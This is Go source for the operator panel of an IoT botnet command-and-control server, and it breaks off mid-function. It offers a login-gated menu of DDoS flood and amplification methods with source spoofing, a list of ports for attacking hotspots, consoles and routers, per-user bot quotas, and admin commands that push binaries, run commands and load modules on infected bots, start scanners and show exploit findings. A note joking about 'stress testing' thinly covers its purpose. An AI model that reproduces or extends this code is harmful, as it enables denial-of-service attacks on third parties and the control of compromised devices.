package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	rateMu       sync.Mutex
	rateMap      = make(map[string]int)
	rateTicker   = time.NewTicker(time.Second)
	lastCmdMutex sync.Mutex
	lastCmd      = make(map[string]string)
)

func init() {
	go func() {
		for range rateTicker.C {
			rateMu.Lock()
			rateMap = make(map[string]int)
			rateMu.Unlock()
		}
	}()
}

func checkRateLimit(username string) bool {
	rateMu.Lock()
	defer rateMu.Unlock()
	rateMap[username]++
	return rateMap[username] <= 5
}

type Admin struct {
	conn     net.Conn
	username string
	R        *Render
	connMu   sync.Mutex
	animStop chan struct{}
	animMu   sync.Mutex
}

func (this *Admin) w(s string) {
	this.connMu.Lock()
	this.conn.Write([]byte(s))
	this.connMu.Unlock()
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn: conn, R: NewRender(conn)}
}

func (this *Admin) writeBanner() {
	this.conn.Write([]byte(CCls))
	this.R.Banner()
}

func (this *Admin) startAnim() {
	this.animMu.Lock()
	defer this.animMu.Unlock()
	if this.animStop != nil {
		return
	}
	this.animStop = make(chan struct{})
	go func() {
		frame := 0
		for {
			select {
			case <-this.animStop:
				return
			default:
			}
			time.Sleep(200 * time.Millisecond)
			frame++
			select {
			case <-this.animStop:
				return
			default:
				this.R.Write(fmt.Sprintf(
					"\033[s\033[15;1H\033[K               by %s%s (unitdev.run)\033[u",
					colorWord(frame), CPink,
				))
			}
		}
	}()
}

func (this *Admin) stopAnim() {
	this.animMu.Lock()
	defer this.animMu.Unlock()
	if this.animStop != nil {
		close(this.animStop)
		this.animStop = nil
	}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.stopAnim()
		this.conn.Write([]byte("\033[?1049l"))
		this.conn.Close()
	}()

	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[38;5;202m \r\n"))
	this.R.LoginPrompt()
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.R.PassPrompt()
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))

	this.username = username

	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte("\r\033[0;91mCheck your login Info\r\n"))
		this.conn.Write([]byte("\033[0;91mSubby if this is you dont even try\033[0m"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d IoT | %s\007", BotCount, username))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

	this.writeBanner()
	online := clientList.Count()
	if userInfo.maxBots != -1 && online > userInfo.maxBots {
		online = userInfo.maxBots
	}
	this.R.RowMuted(fmt.Sprintf("  online: %d  |  help / methods", online))
	this.startAnim()

	var cmdHistory []string
	for {
		var botCatagory string
		var botCount int
		this.R.PromptWithCount(this.username, clientList.Count())
		cmd, err := this.ReadLineWithHistory(false, &cmdHistory)

		if cmd == "clear" || cmd == "cls" || cmd == "c" || cmd == "CLS" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.writeBanner()
			this.startAnim()
			continue
		}
		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		if cmd == "" {
			continue
		}
		if cmd != "exit" && cmd != "quit" {
			cmdHistory = append(cmdHistory, cmd)
			if len(cmdHistory) > 100 {
				cmdHistory = cmdHistory[len(cmdHistory)-100:]
			}
		}
		botCount = userInfo.maxBots

		if err != nil || cmd == "METHODS" || cmd == "methods" || cmd == "attack" || cmd == "DDOS" || cmd == "ddos" || cmd == "ATTACK" {
			this.R.BoxTop(50)
			this.R.BoxRow("TCP: syn, ack, usyn, tcpall, frag, asyn, socket, orbitv3, nfolag, connect")
			this.R.BoxRow("L7: http, hellone, exterogen, voult, discord")
			this.R.BoxRow("UDP: plain, std, game, cudp, dns, ldap, chargen, memcached, udpx")
			this.R.BoxRow("GRE: greip, greeth, mptcpgre, grestack")
			this.R.BoxRow("L7:  http, scanports")
			this.R.BoxRow(CGray + "e.g. syn 1.2.3.4 60 dport=80 burst=16")
			this.R.BoxBot(50)
			continue
		}

		if err != nil || cmd == "TCP" || cmd == "tcp" {
			this.R.BoxTop(56)
			this.R.BoxRow("syn [ip] [time] [dport=80 ...]       — syn flood")
			this.R.BoxRow("usyn [ip] [time] [dport=80 ...]      — usyn flood")
			this.R.BoxRow("ack [ip] [time] [dport=80 ...]       — ack flood")
			this.R.BoxRow("tcpall [ip] [time] [dport=80 ...]    — tcp all flags")
			this.R.BoxRow("frag [ip] [time] [dport=80 ...]      — frag flood")
			this.R.BoxRow("asyn [ip] [time] [dport=80 ...]      — asyn flood")
			this.R.BoxRow("socket [ip] [time] [dport=80 ...]    — socket flood")
			this.R.BoxRow("orbitv3 [ip] [time] [burst=4 ...]    — orbitv3")
			this.R.BoxRow("nfolag [ip] [time] [usyn=0|1 ...]    — nfolag")
			this.R.BoxRow("connect [ip] [time] dport=80 conns=N — exhaustion")
			this.R.BoxRow(CPink + "FLAGS" + CWhiteB + "  — full flag list")
			this.R.BoxBot(56)
			continue
		}

		if err != nil || cmd == "UDP" || cmd == "udp" {
			this.R.BoxTop(56)
			this.R.BoxRow("plain [ip] [time] [dport=80 len=4096]   — plain udp")
			this.R.BoxRow("std [ip] [time] [dport=80 len=1024]    — std udp")
			this.R.BoxRow("cudp [ip] [time] [dport=80 ...]        — cudp flood")
			this.R.BoxRow("dns [ip] [time] dport=53 domain=x.com  — dns amplify")
			this.R.BoxRow("ldap [ip] [time] dport=389 len=512     — ldap amplify")
			this.R.BoxRow("chargen [ip] [time] dport=19           — chargen")
			this.R.BoxRow("memcached [ip] [time] dport=11211      — memcached")
			this.R.BoxBot(56)
			continue
		}

		if err != nil || cmd == "GRE" || cmd == "gre" {
			this.R.BoxTop(56)
			this.R.BoxRow("greip [ip] [time] [dport=80 ...]       — greip")
			this.R.BoxRow("greeth [ip] [time] [dport=80 ...]      — gre eth")
			this.R.BoxRow("mptcpgre [ip] [time] [burst=64 ...]    — mptcpgre")
			this.R.BoxRow("grestack [ip] [time] [burst=32 ...]    — gre stack")
			this.R.BoxBot(56)
			continue
		}

		if err != nil || cmd == "L7" || cmd == "l7" || cmd == "layer7" || cmd == "LAYER7" {
			this.R.BoxTop(56)
			this.R.BoxRow("http [ip] [time] domain=[ip] conns=[300]   — http flood")
			this.R.BoxRow("scanports [ip] [1] ports=80,443,23        — port scan")
			this.R.BoxBot(56)
			continue
		}

		if err != nil || cmd == "FLAGS" || cmd == "flags" {
			this.R.BoxTop(68)
			this.R.BoxRow("attack method ip time [flag=val flag=val ...]")
			this.R.BoxRow("or  method ip time ?  — show flags for this method")
			this.R.BoxMid(68)
			this.R.BoxRow("len=N        — payload size (bytes)")
			this.R.BoxRow("rand=1|0     — randomize payload")
			this.R.BoxRow("tos=0        — IP TOS")
			this.R.BoxRow("ident=0      — IP ID (65535=random)")
			this.R.BoxRow("ttl=64       — IP TTL")
			this.R.BoxRow("df=1|0       — don't fragment")
			this.R.BoxRow("sport=0      — source port (0/65535=random)")
			this.R.BoxRow("dport=80     — dest port")
			this.R.BoxRow("burst=4      — orbitv3/mptcpgre/grestack burst")
			this.R.BoxRow("usyn=0|1     — nfolag: 0=asyn 1=usyn")
			this.R.BoxRow("domain=x     — dns: query domain")
			this.R.BoxRow("conns=256    — connect: parallel conns")
			this.R.BoxRow("ports=80,443 — scanports: port list")
			this.R.BoxRow(CPink + "source=ip" + CWhiteB + " — spoof source (admin)")
			this.R.BoxBot(68)
			continue
		}

		if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
			// parse HELP [page|command]
			helpArg := ""
			if parts := strings.Fields(cmd); len(parts) > 1 {
				helpArg = strings.ToUpper(parts[1])
			}

			switch helpArg {
			case "2":
				this.R.BoxTop(65)
				this.R.BoxRow(CPink + "INFO" + CWhiteB + "     — your account limits")
				this.R.BoxRow(CPink + "TOOLS" + CWhiteB + "    — ping, whois, resolve, tracer...")
				this.R.BoxRow(CPink + "PORTS" + CWhiteB + "    — common target ports")
				this.R.BoxRow(CPink + "HISTORY" + CWhiteB + "  — last attacks")
				this.R.BoxRow(CPink + "AT" + CWhiteB + "         — schedule attack")
				this.R.BoxRow(CPink + "ACTIVE" + CWhiteB + "     — show active attacks")
				this.R.BoxRow(CPink + "COUNT" + CWhiteB + "    — online bot count")
				this.R.BoxRow(CPink + "PEERS" + CWhiteB + "    — cluster node status")
				this.R.BoxRow(CPink + "CLS/C" + CWhiteB + "    — clear screen")
				this.R.BoxBot(65)
			case "3":
				this.R.BoxTop(65)
				this.R.BoxRow(CPink + "ADDUSER" + CWhiteB + "    — add user (admin)")
				this.R.BoxRow(CPink + "RMUSER" + CWhiteB + "     — remove user (admin)")
				this.R.BoxRow(CPink + "USERS" + CWhiteB + "     — list users (admin)")
				this.R.BoxRow(CPink + "BOTS" + CWhiteB + "      — bot list (admin)")
				this.R.BoxRow(CPink + "BLACKLIST" + CWhiteB + " — manage blacklist (admin)")
				this.R.BoxRow(CPink + "WHITELIST" + CWhiteB + " — manage whitelist (admin)")
				this.R.BoxRow(CPink + "UPDATE" + CWhiteB + "    — update bot binary (admin)")
				this.R.BoxRow(CPink + "SELFUPDATE" + CWhiteB + " — run cmd on bots (admin)")
				this.R.BoxRow(CPink + "STOP" + CWhiteB + "      — stop all attacks (admin)")
				this.R.BoxRow(CPink + "SENDMODULE" + CWhiteB + "  — send .so to bots (admin)")
				this.R.BoxRow(CPink + "BUILDMODULE" + CWhiteB + " — compile module (admin)")
			this.R.BoxRow(CPink + "MODULES" + CWhiteB + "     — list available modules (admin)")
			this.R.BoxRow(CPink + "UNLOADMODULE" + CWhiteB + " — unload module (admin)")
				this.R.BoxBot(65)
			case "ADDUSER", "ADDADMIN":
				this.R.Rowf("ADDUSER <user> <pass> <maxbots> <dur> <cd>  — add user")
				this.R.Rowf("ADDADMIN <user> <pass> <maxbots> <dur> <cd> — add admin")
				this.R.Rowf("  maxbots: bot limit (-1 = unlimited)")
				this.R.Rowf("  dur: attack duration limit in seconds (0 = blocked)")
				this.R.Rowf("  cd: cooldown between attacks in seconds")
			case "BOTS":
				this.R.Rowf("BOTS [limit] [@arch] [dns] — list bots")
				this.R.Rowf("  BOTS 20     — show 20 bots")
				this.R.Rowf("  BOTS @x86   — filter by arch")
				this.R.Rowf("  BOTS dns    — show only DNS bots")
			default:
				this.R.BoxTop(65)
				this.R.BoxRow(CPink + "ATTACK" + CWhiteB + "   — attack methods (TCP/UDP/GRE/L7)")
				this.R.BoxRow(CPink + "FLAGS" + CWhiteB + "    — all attack flags")
				this.R.BoxRow(CPink + "INFO" + CWhiteB + "     — your account limits")
				this.R.BoxRow(CPink + "TOOLS" + CWhiteB + "    — ping, whois, resolve, tracer...")
				this.R.BoxRow(CPink + "PORTS" + CWhiteB + "    — common target ports")
				this.R.BoxRow(CPink + "HISTORY" + CWhiteB + "  — last attacks (history up = asc)")
				this.R.BoxRow(CPink + "AT" + CWhiteB + "         — schedule attack")
				this.R.BoxRow(CPink + "ACTIVE" + CWhiteB + "     — show active attacks")
				this.R.BoxRow(CPink + "COUNT" + CWhiteB + "    — online bot count")
				this.R.BoxRow(CPink + "PEERS" + CWhiteB + "    — cluster node status")
				this.R.BoxRow(CPink + "ADMIN" + CWhiteB + "    — admin panel (admin only)")
				this.R.BoxRow(CPink + "BLACKLIST" + CWhiteB + " — manage blacklist (admin)")
				this.R.BoxRow(CPink + "WHITELIST" + CWhiteB + " — manage whitelist (admin)")
				this.R.BoxMid(65)
				this.R.BoxRow(CGray + "HELP 2 — user commands")
				this.R.BoxRow(CGray + "HELP 3 — admin commands")
				this.R.BoxRow(CGray + "HELP <cmd> — specific help")
				this.R.BoxRow(CGray + " -N cmd — limit to N bots (e.g. -100 syn ...)")
				this.R.BoxRow(CGray + " @src   — filter by arch (e.g. @x86 plain ...)")
				this.R.BoxBot(65)
			}
			continue
		}

		if err != nil || cmd == "TOOLS" || cmd == "tools" {
			this.R.BoxTop(56)
			this.R.BoxRow("ping [host]       — ping host")
			this.R.BoxRow("resolve [domain]  — resolve domain")
			this.R.BoxRow("whois [ip/host]   — whois lookup")
			this.R.BoxRow("tracer [host]     — trace route")
			this.R.BoxRow("portscan [host]   — port scan")
			this.R.BoxRow("cportscan [range] — CIDR port scan")
			this.R.BoxRow("geoip [ip]        — ip geolocation")
			this.R.BoxRow("profind [name]    — profile finder")
			this.R.BoxRow("query [filter]    — e.g. ?syn")
			this.R.BoxBot(56)
			continue
		}

		if err != nil || cmd == "EXPLOITS" || cmd == "exploits" {
			f, err := os.Open("sl_exploits.txt")
			if err != nil {
				this.conn.Write([]byte("\x1b[38;5;240mNo exploits file or empty\x1b[0m\r\n"))
				continue
			}
			var lines []string
			sc := bufio.NewScanner(f)
			for sc.Scan() {
				lines = append(lines, sc.Text())
			}
			f.Close()
			n := len(lines)
			if n == 0 {
				this.conn.Write([]byte("\x1b[38;5;240mNo exploit findings yet\x1b[0m\r\n"))
				continue
			}
			start := 0
			if n > 20 {
				start = n - 20
			}
			this.conn.Write([]byte("\x1b[38;5;52m--- last exploit findings ---\x1b[38;5;240m\r\n"))
			for i := start; i < n; i++ {
				this.conn.Write([]byte(lines[i] + "\r\n"))
			}
			continue
		}

		if err != nil || strings.HasPrefix(strings.ToLower(cmd), "history") {
			asc := false
			if strings.Contains(strings.ToLower(cmd), " up") {
				asc = true
			}
			hist, err := database.GetAttackHistory(username, 20, asc)
			if err != nil {
				this.conn.Write([]byte("\x1b[38;5;196mError\x1b[38;5;240m\r\n"))
				continue
			}
			this.conn.Write([]byte("\x1b[38;5;52m\x1b[48;5;232m"))
			this.conn.Write([]byte("\x1b[38;5;196m time\t\tdur\tcmd\tbots\x1b[38;5;240m\r\n"))
			for _, h := range hist {
				t := time.Unix(int64(0), 0)
				if ts, e := strconv.ParseInt(h["time"], 10, 64); e == nil {
					t = time.Unix(ts, 0)
				}
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;240m%s\t%s\t%s\t%s\x1b[0m\r\n", t.Format("15:04 2Jan"), h["duration"], h["command"], h["max_bots"])))
			}
			continue
		}

		if err != nil || cmd == "PORTS" || cmd == "ports" {
			this.R.BoxTop(70)
			this.R.BoxRow(CPink + "HOTSPOT PORTS:" + CGray + "              " + CPink + "VERIZON 4G LTE:")
			this.R.BoxRow("UDP 1900                       UDP 53,123,500,4500,52248")
			this.R.BoxRow("TCP 2859,5000                  TCP 53")
			this.R.BoxMid(70)
			this.R.BoxRow(CPink + "AT&T Wi-Fi HOTSPOTS" + CGray + "          " + CPink + "ATTACK PORTS:")
			this.R.BoxRow("UDP 137,138,139,445,8053       699  Good For Hotspots")
			this.R.BoxRow("TCP 1434,8053,8083,8084        5060 Router Reset")
			this.R.BoxMid(70)
			this.R.BoxRow(CPink + "GENERAL PORTS:")
			this.R.BoxRow("HOME: 80,53,22,8080            HTTP: 80,8080,443")
			this.R.BoxRow("XBOX: 3074                     VPN: 7777")
			this.R.BoxRow("PS4: 9307                      NFO: 1192")
			this.R.BoxRow("PS3: TCP 3478-3480,5223        OVH: 992")
			this.R.BoxRow("     UDP 3478,3479             HOTSPOT: 9286")
			this.R.BoxBot(70)
			continue
		}

		if err != nil || cmd == "admin" || cmd == "ADMIN" {
			this.R.BoxTop(56)
			this.R.BoxHeader(CPink + "admin commands")
			this.R.BoxRow(CPink + "ADDUSER" + CWhiteB + "      — add user")
			this.R.BoxRow(CPink + "ADDADMIN" + CWhiteB + "     — add admin (*must be admin*)")
			this.R.BoxRow(CPink + "RMUSER" + CWhiteB + "       — remove user")
			this.R.BoxRow(CPink + "USERS" + CWhiteB + "        — list users")
			this.R.BoxRow(CPink + "BOTS" + CWhiteB + "         — distribution + count")
			this.R.BoxRow(CPink + "UPDATE" + CWhiteB + "       — update bot binary (all/arch)")
			this.R.BoxRow(CPink + "SELFUPDATE" + CWhiteB + "   — run cmd on bots")
			this.R.BoxRow(CPink + "SCANSTART" + CWhiteB + "    — start scanners")
			this.R.BoxRow(CPink + "SCANSTOP" + CWhiteB + "     — stop scanners")
			this.R.BoxRow(CPink + "STOP" + CWhiteB + "         — stop all attacks")
			this.R.BoxRow(CPink + "SENDMODULE" + CWhiteB + "   — send .so module to bots")
			this.R.BoxRow(CPink + "CALLMODULE" + CWhiteB + "   — call func in loaded module")
			this.R.BoxRow(CPink + "LISTMODULES" + CWhiteB + "  — list loaded modules")
			this.R.BoxRow(CPink + "BUILDMODULE" + CWhiteB + "  — compile modules/src/<name>.c → .so")
			this.R.BoxBot(56)
			continue
		}

		if err != nil || cmd == "INFO" || cmd == "info" {
			online := clientList.Count()
			if userInfo.maxBots != -1 && online > userInfo.maxBots {
				online = userInfo.maxBots
			}
			mbStr := fmt.Sprintf("%d", userInfo.maxBots)
			if userInfo.maxBots < 0 {
				mbStr = "unlimited"
			}
			durStr := "none"
			if userInfo.durationLimit > 0 {
				durStr = fmt.Sprintf("%ds", userInfo.durationLimit)
			} else if userInfo.durationLimit == 0 {
				durStr = "0 (blocked)"
			}
			this.R.BoxTop(38)
			this.R.BoxRowf(CYellow+"User:"+CWhiteB+"      %s", username)
			this.R.BoxRowf(CYellow+"Online:"+CWhiteB+"    %d", online)
			this.R.BoxRowf(CYellow+"Max bots:"+CWhiteB+"  %s", mbStr)
			this.R.BoxRowf(CYellow+"Max time:"+CWhiteB+"  %s", durStr)
			this.R.BoxRowf(CYellow+"Cooldown:"+CWhiteB+"  %ds", userInfo.cooldown)
			this.R.BoxBot(38)
			continue
		}

		if err != nil || cmd == "COUNT" || cmd == "count" {
			online := clientList.Count()
			if userInfo.maxBots != -1 && online > userInfo.maxBots {
				online = userInfo.maxBots
			}
			this.R.Rowf("Online: %d", online)
			continue
		}

		if err != nil || cmd == "ACTIVE" || cmd == "active" || cmd == "TOP" || cmd == "top" {
			this.conn.Write([]byte(formatActiveAttacks()))
			continue
		}

		if err != nil || cmd == "PEERS" || cmd == "peers" {
			if peerMgr == nil {
				this.R.BoxTop(30)
				this.R.BoxRow("peering disabled")
				this.R.BoxBot(30)
			} else {
				statuses := peerMgr.PeerStatuses()
				this.R.BoxTop(50)
				this.R.BoxRowf(CPink+"Node:"+CWhiteB+" %d", cfg.CncID)
				for _, s := range statuses {
					st := CRed + "DOWN"
					if s.Up {
						st = CGreen + "UP"
					}
					this.R.BoxRowf("peer id=%-3d %s %s", s.ID, st, s.Addr)
				}
				this.R.BoxMid(50)
				this.R.BoxRowf(CYellow+"Local bots:"+CWhiteB+" %d", clientList.BotCount())
				this.R.BoxBot(50)
			}
			continue
		}

		if err != nil || cmd == "RULES" || cmd == "rules" {
			this.R.BoxTop(38)
			this.R.BoxRow(CRed + "DO NOT SPAM ATTACKS!")
			this.R.BoxRow(CRed + "DO NOT SHARE LOGINS! (IP is logged)")
			this.R.BoxRow(CRed + "DO NOT ATTACK GOVERNMENTS!")
			this.R.BoxRow("ONLY USE FOR sTrEsS tEsTiNg :)")
			this.R.BoxRow(CRed + "3 Warnings = Ban")
			this.R.BoxBot(38)
			continue
		}

		botCount = userInfo.maxBots

		if err != nil || cmd == "logout" || cmd == "LOGOUT" {
			return
		}

		parts := strings.Fields(cmd)
		baseCmd := ""
		toolArg := ""
		if len(parts) > 0 {
			baseCmd = strings.ToUpper(parts[0])
			if len(parts) > 1 {
				toolArg = strings.TrimSpace(strings.Join(parts[1:], " "))
			}
		}

		getToolIP := func(prompt string) (string, error) {
			if toolArg != "" {
				return toolArg, nil
			}
			this.conn.Write([]byte("\x1b[96m" + prompt + "\x1b[97m: \x1b[97m"))
			return this.ReadLine(false)
		}

		if baseCmd == "IPLOOKUP" {
			locipaddress, err := getToolIP("IP Address")
			if err != nil {
				return
			}
			url := "http://ip-api.com/line/" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}

		if baseCmd == "WHOIS" {
			locipaddress, err := getToolIP("IP or domain")
			if err != nil {
				return
			}
			url := "http://ip-api.com/line/" + locipaddress + "?fields=status,country,regionName,city,isp,org,as,query"
			tr := &http.Transport{ResponseHeaderTimeout: 5 * time.Second, DisableCompression: true}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			resp, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %v\033[37;1m\r\n", err)))
				continue
			}
			data, _ := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			locformatted := strings.Replace(strings.TrimSpace(string(data)), "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}

		if baseCmd == "PING" {
			locipaddress, err := getToolIP("IP Address")
			if err != nil {
				return
			}
			out, err := runLocalCmd("ping", "-c", "4", locipaddress)
			if err != nil {
				out, _ = runLocalCmd("ping", "-n", "4", locipaddress)
			}
			locformatted := strings.Replace(out, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}

		if baseCmd == "TRACER" {
			locipaddress, err := getToolIP("IP Address")
			if err != nil {
				return
			}
			out, err := runLocalCmd("traceroute", "-n", locipaddress)
			if err != nil {
				out, _ = runLocalCmd("tracert", locipaddress)
			}
			locformatted := strings.Replace(out, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}

		if baseCmd == "RESOLVE" {
			locipaddress, err := getToolIP("Domain (without www)")
			if err != nil {
				return
			}
			out, err := runLocalCmd("host", locipaddress)
			if err != nil {
				out, err = runLocalCmd("nslookup", locipaddress)
			}
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %v\033[37;1m\r\n", err)))
				continue
			}
			locformatted := strings.Replace(out, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}

		if baseCmd == "REVDNS" {
			locipaddress, err := getToolIP("IP Address")
			if err != nil {
				return
			}
			out, err := runLocalCmd("host", locipaddress)
			if err != nil {
				out, err = runLocalCmd("nslookup", locipaddress)
			}
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %v\033[37;1m\r\n", err)))
				continue
			}
			locformatted := strings.Replace(out, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}

		if baseCmd == "ASNLOOKUP" {
			locipaddress, err := getToolIP("IP Address")
			if err != nil {
				return
			}
			url := "http://ip-api.com/line/" + locipaddress
			tr := &http.Transport{ResponseHeaderTimeout: 5 * time.Second, DisableCompression: true}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError\033[37;1m\r\n")))
				continue
			}
			locresponsedata, _ := ioutil.ReadAll(locresponse.Body)
			locresponse.Body.Close()
			locformatted := strings.Replace(string(locresponsedata), "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}

		if baseCmd == "SUBCALC" {
			locipaddress, err := getToolIP("IP/CIDR (e.g. 192.168.1.0/24)")
			if err != nil {
				return
			}
			out, err := runLocalCmd("ipcalc", locipaddress)
			if err != nil {
				out, err = runLocalCmd("sipcalc", locipaddress)
			}
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: ipcalc/sipcalc not found\033[37;1m\r\n")))
				continue
			}
			locformatted := strings.Replace(out, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}

		if baseCmd == "ZTRANSF" {
			locipaddress, err := getToolIP("Domain (without www)")
			if err != nil {
				return
			}
			out, err := runLocalCmd("dig", "axfr", locipaddress)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %v\033[37;1m\r\n", err)))
				continue
			}
			locformatted := strings.Replace(out, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}
		if userInfo.admin == 1 && (cmd == "*ADDADMIN*" || cmd == "*addadmin*") {
			this.conn.Write([]byte("\033[0mUsername:\033[01;97m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mPassword:\033[01;97m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mBotcount\033[01;97m(\033[0m-1 for access to all\033[01;97m)\033[0m:\033[01;97m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
				continue
			}
			this.conn.Write([]byte("\033[0mAttack Duration\033[01;97m(\033[0m-1 for none\033[01;97m)\033[0m:\033[01;97m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
				continue
			}
			this.conn.Write([]byte("\033[0mCooldown\033[01;97m(\033[0m0 for none\033[01;97m)\033[0m:\033[01;97m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
				continue
			}
			this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;97m" + new_un + "\r\n\033[0m- Password - \033[01;97m" + new_pw + "\r\n\033[0m- Bots - \033[01;97m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;97m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;97m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;97m(\033[01;91my\033[01;97m/\033[038;5;202mn\033[01;97m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && (cmd == "rmuser" || cmd == "RMUSER") {
			this.conn.Write([]byte("\033[038;5;202mUsername: \033[0;97m"))
			rm_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(" \033[01;91mAre You Sure You Want To Remove \033[01;97m" + rm_un + "?\033[038;5;202m(\033[01;32my\033[038;5;202m/\033[038;5;202mn\033[038;5;202m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.RemoveUser(rm_un) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;91mUnable to remove users\r\n")))
			} else {
				this.conn.Write([]byte("\033[01;92mUser Successfully Removed!\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && (cmd == "adduser" || cmd == "ADDUSER") {
			this.conn.Write([]byte("enter new username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("enter new password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("enter wanted bot count (-1 for full net): "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;91m%s\033[0m\r\n", "failed to parse the bot count")))
				continue
			}
			this.conn.Write([]byte("max attack duration (-1 for none): "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
